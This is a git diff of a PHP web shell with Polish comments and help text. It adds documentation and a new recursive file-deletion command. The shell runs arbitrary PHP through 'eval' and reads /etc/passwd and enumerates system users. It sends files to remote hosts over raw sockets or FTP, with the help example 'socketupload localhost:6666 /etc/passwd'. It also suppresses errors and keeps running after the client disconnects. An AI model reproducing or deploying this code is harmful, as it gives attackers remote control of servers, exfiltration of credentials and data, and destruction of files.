@@ -7,42 +7,106 @@ require_once __DIR__ . '/Html.php';
 
 class Shell
 {
+	/**
+	 * Czas generowania strony
+	 *
+	 * @access private
+	 * @var    float
+	 */
 	private $fGeneratedIn;
+
+	/**
+	 * SafeMode ON / OFF
+	 *
+	 * @access private
+	 * @var    boolean
+	 */
 	private $bSafeMode;
-	private $aDisableFunctions;
+
+	/**
+	 * Tablica wylaczaonych funkcji
+	 *
+	 * @access private
+	 * @var    array
+	 */
+	private $aDisableFunctions = array();
+
+	/**
+	 * Dzialamy w srodowisku Windows ?
+	 *
+	 * @access private
+	 * @var    boolean
+	 */
 	private $bWindows;
 
 	/**
 	 * Komenda
+	 *
+	 * @access private
+	 * @var    string
 	 */
 	private $sCmd;
 
 	/**
-	 * Parametry
-	 * @var type
+	 * Lista parametrow
+	 *
+	 * @access private
+	 * @var    array
 	 */
 	private $aArgv = array();
 
 	/**
 	 * Ilosc parametrow
 	 *
-	 * @var  integer
+	 * @access private
+	 * @var    integer
 	 */
 	private $iArgc = 0;
 
 	/**
-	 * Ciag parametrow
+	 * Ciag jako jeden wielki parametr
+	 *
+	 * @access private
+	 * @var    string
 	 */
 	private $sArg;
 
-
+	/**
+	 * Czy funkcja posix_getpwuid istnieje
+	 *
+	 * @access private
+	 * @var    boolean
+	 */
 	private $bFuncOwnerById = FALSE;
+
+	/**
+	 * Czy funkcja posix_getgrgid istnieje
+	 *
+	 * @access private
+	 * @var    boolean
+	 */
 	private $bFuncGroupById = FALSE;
 
+	/**
+	 * Konstruktor
+	 *
+	 * @return void
+	 */
 	public function __construct()
 	{
+		/**
+		 * Czas generowania strony
+		 */
+		$this -> fGeneratedIn = microtime( 1 );
+
+		/**
+		 * @see Request::init
+		 */
 		Request::init();
 
+		/**
+		 * Czy dzialamy na Windowsie ?
+		 */
 		$this -> bWindows = ( strncmp( PHP_OS, 'WIN', 3 ) === 0 );
 
 		/**
@@ -50,39 +114,52 @@ class Shell
 		 */
 		$this -> bSafeMode = (bool) ini_get( 'safe_mode' );
 
+		/**
+		 * Czy funkcje sa dostepne
+		 */
 		$this -> bFuncOwnerById = function_exists( 'posix_getpwuid' );
 		$this -> bFuncGroupById = function_exists( 'posix_getgrgid' );
 
-
-		//error_reporting( 0 );
+		/**
+		 * Jesli SafeMode jest wylaczony
+		 */
 		if( ! $this -> bSafeMode )
 		{
-			ini_set( 'max_execution_time', 0);
+			ini_set( 'max_execution_time', 0 );
 			ini_set( 'memory_limit', '1024M' );
-		//	ini_set( 'display_errors', 0 );
+			ini_set( 'display_errors', 0 );
+			ini_set( 'default_socket_timeout', 5 );
 		}
+
+		/**
+		 * Config
+		 */
+		ignore_user_abort( 1 );
+		error_reporting( 0 );
 
 		/**
 		 * disable_functions
 		 */
-		if( ( $aDisableFunctions = explode( ',', ini_get( 'disable_functions' ) ) ) === '' )
+		if( ( $sDisableFunctions = ini_get( 'disable_functions' ) ) !== '' )
 		{
-			$aDisableFunctions = FALSE;
-		}
-		else
-		{
+			$aDisableFunctions = explode( ',', $sDisableFunctions );
 			array_walk( $aDisableFunctions, function( $sValue )
 				{
 					return strtolower( trim( $sValue ) );
 				}
 			);
+
+			$this -> aDisableFunctions = $aDisableFunctions;
 		}
-
-		$this -> aDisableFunctions = $aDisableFunctions;
-
-		$this -> fGeneratedIn = microtime( 1 );
 	}
 
+	/**
+	 * Pobieranie nazwy uzytkownika po jego ID
+	 *
+	 * @access private
+	 * @param  integer        $iValue ID uzytkownika
+	 * @return string|integer         Nazwa uzytkownika / ID uzytkownika
+	 */
 	private function getOwnerById( $iValue )
 	{
 		if( $this -> bFuncOwnerById )
@@ -94,6 +171,13 @@ class Shell
 		return $iValue;
 	}
 
+	/**
+	 * Pobieranie nazwy grupy po jej ID
+	 *
+	 * @access private
+	 * @param  integer        $iValue ID grupy
+	 * @return string|integer         Nazwa grupy / ID grupy
+	 */
 	private function getGroupById( $iValue )
 	{
 		if( $this -> bFuncGroupById )
@@ -105,7 +189,13 @@ class Shell
 		return $iValue;
 	}
 
-
+	/**
+	 * Pobieranie nazwy hosta i portu
+	 *
+	 * @access private
+	 * @param  integer $sValue Host:port
+	 * @return array           Host i port
+	 */
 	private function getHost( $sValue )
 	{
 		list( $sHost, $iPort ) = explode( ':', $sValue );
@@ -113,11 +203,25 @@ class Shell
 		return array( $sHost, (int) $iPort );
 	}
 
-	private function getStatus( $bValue, $bNegative = 0 )
+	/**
+	 * Pobieranie statusu TAK / NIE
+	 *
+	 * @access private
+	 * @param  boolean $bValue    Wartosc
+	 * @param  boolean $bNegative Negacja 1, 0 zwroci zielone TAK, 1, 1 zwroci czerwone TAK
+	 * @return string             Status
+	 */
+	private function getStatus( $bValue, $bNegative = FALSE )
 	{
 		return sprintf( '<span class="%s">%s</span>', ( ( $bNegative ? ! $bValue : $bValue ) ? 'green' : 'red' ), ( $bValue ? 'TAK' : 'NIE' ) );
 	}
 
+	/**
+	 * Pobieranie menu
+	 *
+	 * @access private
+	 * @return string  Menu w HTMLu
+	 */
 	private function getMenu()
 	{
 		return sprintf( 'Wersja PHP: <strong>%s</strong><br />' .
@@ -144,7 +248,7 @@ class Shell
 echo - Wyświetla tekst
 
 	Użycie:
-		echo [tekst do wyświetlenia]
+		echo tekst do wyświetlenia
 HELP;
 		}
 
@@ -160,9 +264,9 @@ HELP;
 game - Gra z komputerem
 
 	Użycie:
-		echo [cyfra z przedziału 0-9]
+		echo cyfra_z_przedziału_0-9
 
-		echo [cyfra z przedziału 0-9] [ilość losowań]
+		echo cyfra_z_przedziału_0-9 [ilość_losowań]
 HELP;
 		}
 
@@ -224,7 +328,7 @@ HELP;
 eval - Wykonanie kodu PHP
 
 	Użycie:
-		eval [skrypt php]
+		eval skrypt_php
 
 	Przykład:
 		eval echo md5( 'test' );
@@ -253,7 +357,7 @@ HELP;
 socketupload, socketup - Wysyłanie pliku za pomocą protokołu TCP
 
 	Użycie:
-		socketupload - host:port [ścieżka do pliku]
+		socketupload host:port ścieżka_do_pliku
 
 	Przykład:
 		socketupload localhost:6666 /etc/passwd
@@ -305,7 +409,7 @@ HELP;
 socketdownload, socketdown - Pobieranie pliku za pomocą protokołu TCP
 
 	Użycie:
-		socketupload - host:port [ścieżka do pliku gdzie ma być on zapisany]
+		socketupload host:port ścieżka_do_pliku_gdzie_ma_być_zapisany
 
 	Przykład:
 		socketupload localhost:6666 /tmp/plik.txt
@@ -354,7 +458,7 @@ HELP;
 ftpupload, ftpup - Wysyłanie pliku na FTP
 
 	Użycie:
-		ftpupload - host:port login@hasło [plik źródłowy] [ścieżka docelowa]
+		ftpupload host:port login@hasło plik_źródłowy ścieżka_docelowa
 
 	Przykład:
 		ftpupload localhost:6666 test@test /home/usr/plik.txt /
@@ -412,7 +516,7 @@ HELP;
 ftpdownload, ftpdown - Pobieranie pliku z FTP
 
 	Użycie:
-		ftpdownload - host:port login@hasło [plik źródłowy] [plik docelowy]
+		ftpdownload host:port login@hasło plik_źródłowy plik_docelowy_
 
 	Przykład:
 		ftpdownload localhost:6666 test@test /plik.txt /home/usr/plik.txt
@@ -469,7 +573,7 @@ HELP;
 ls - Wyświetlanie informacji o plikach i katalogach
 
 	Użycie:
-		ls [ścieżka do katalogu]
+		ls ścieżka_do_katalogu
 
 	Opcje:
 		-l  wyświetlanie szczegółowych informacji o plikach i katalogach
@@ -543,6 +647,74 @@ HELP;
 	}
 
 
+	private function getCommandRemove()
+	{
+		if( ( $this -> iArgc !== 1 ) || ( $this -> aArgv[0] === 'help' ) )
+		{
+			return <<<HELP
+remove, rm, delete, del - Usuwanie pliku / katalogu. Zawartość katalogu zostanie usunięta rekurencyjnie
+
+	Użycie:
+		remove ścieżka_do_katalogu_lub_pliku
+HELP;
+		}
+
+		$sOutput = NULL;
+
+		if( is_file( $this -> aArgv[0] ) )
+		{
+			if( ! unlink( $this -> aArgv[0] ) )
+			{
+				return sprintf( 'Plik "%s" <span class="red">nie został usunięty</span>', $this -> aArgv[0] );
+			}
+
+			return sprintf( 'Plik "%s" <span class="green">został usunięty</span>', $this -> aArgv[0] );
+		}
+
+		if( is_dir( $this -> aArgv[0] ) )
+		{
+			try
+			{
+				$oDirectory = new RecursiveIteratorIterator( new RecursiveDirectoryIterator( $this -> aArgv[0], RecursiveDirectoryIterator::SKIP_DOTS ), RecursiveIteratorIterator::CHILD_FIRST );
+
+				foreach( $oDirectory as $oFile )
+				{
+					if( $oFile -> isDir() )
+					{
+						if( ! rmdir( $oFile -> getPathname() ) )
+						{
+							$sOutput .= sprintf( "Katalog \"%s\" <span class=\"red\">nie został usunięty</span>\n", $oFile -> getPathname() );
+						}
+					}
+					else
+					{
+						if( ! unlink( $oFile -> getPathname() ) )
+						{
+							$sOutput .= sprintf( "Plik    \"%s\" <span class=\"red\">nie został usunięty</span>\n", $oFile -> getPathname() );
+						}
+					}
+				}
+
+				if( ! rmdir( $this -> aArgv[0] ) )
+				{
+					return $sOutput . sprintf( 'Katalog "%s" <span class="red">nie został usunięty</span>', $this -> aArgv[0] );
+				}
+			}
+			catch( Exception $oException )
+			{
+				return sprintf( "Nie można otworzyć katalogu \"%s\"\n\nErro: %s", $sDir, $oException -> getMessage()  );
+			}
+
+
+			return sprintf( 'Katalog "%s" <span class="green">został usunięty</span>', $this -> aArgv[0] );
+		}
+
+		return sprintf( 'Podana ścieżka "%s" nie istnieje', $this -> aArgv[0] );
+	}
+
+
+
+
 	private function getCommandBCat()
 	{
 		if( ( $this -> iArgc !== 1 ) || ( $this -> aArgv[0] === 'help' ) )
@@ -551,7 +723,7 @@ HELP;
 bcat, b64 - Wyświetlanie zawartości pliku przy użyciu base64
 
 	Użycie:
-		bcat [ścieżka do pliku]
+		bcat ścieżka_do_pliku
 
 	Przykład:
 		bcat /etc/passwd
@@ -577,7 +749,7 @@ HELP;
 cat - Wyświetlanie zawartości pliku
 
 	Użycie:
-		cat [ścieżka do pliku]
+		cat ścieżka_do_pliku
 
 	Przykład:
 		cat /etc/passwd
@@ -601,7 +773,7 @@ HELP;
 download, down - Pobieranie pliku
 
 	Użycie:
-		download [ścieżka do pliku]
+		download ścieżka_do_pliku
 
 	Opcje:
 		-g pobieranie przy użyciu kompresji GZIP
@@ -701,7 +873,7 @@ HELP;
 	}
 
 
-	private function getCommandPhpinfo()
+	private function getCommandPhpInfo()
 	{
 		if( ( $this -> iArgc === 1 ) && ( $this -> aArgv[0] === 'help' ) )
 		{
@@ -710,7 +882,6 @@ phpinfo - Informacje o PHP
 
 	Użycie:
 		phpinfo
-
 HELP;
 		}
 
@@ -758,9 +929,9 @@ HELP;
 etcpasswd - Próba pobrania struktury pliku /etc/passwd za pomocą funkcji posix_getpwuid
 
 	Użycie:
-		etcpasswd  (domyślnie z przedziały 0 do 65535)
+		etcpasswd
 
-		etcpasswd limit_dolny limit_górny
+		etcpasswd [limit_dolny] [limit_górny]
 
 	Przykład:
 
@@ -914,6 +1085,12 @@ HELP;
 				case 'phpinfo':
 					$sConsole = $this -> getCommandPhpInfo();
 					break;
+				case 'remove':
+				case 'rm':
+				case 'delete':
+				case 'del':
+					$sConsole = $this -> getCommandRemove();
+					break ;
 				default :
 					$sConsole = sprintf( 'Nie ma takiej komendy "%s"', $this -> sCmd );
 			}
@@ -1054,4 +1231,4 @@ if( ob_get_length() > 0 )
 	ob_end_flush();
 }
 
-exit ;
+__halt_compiler();
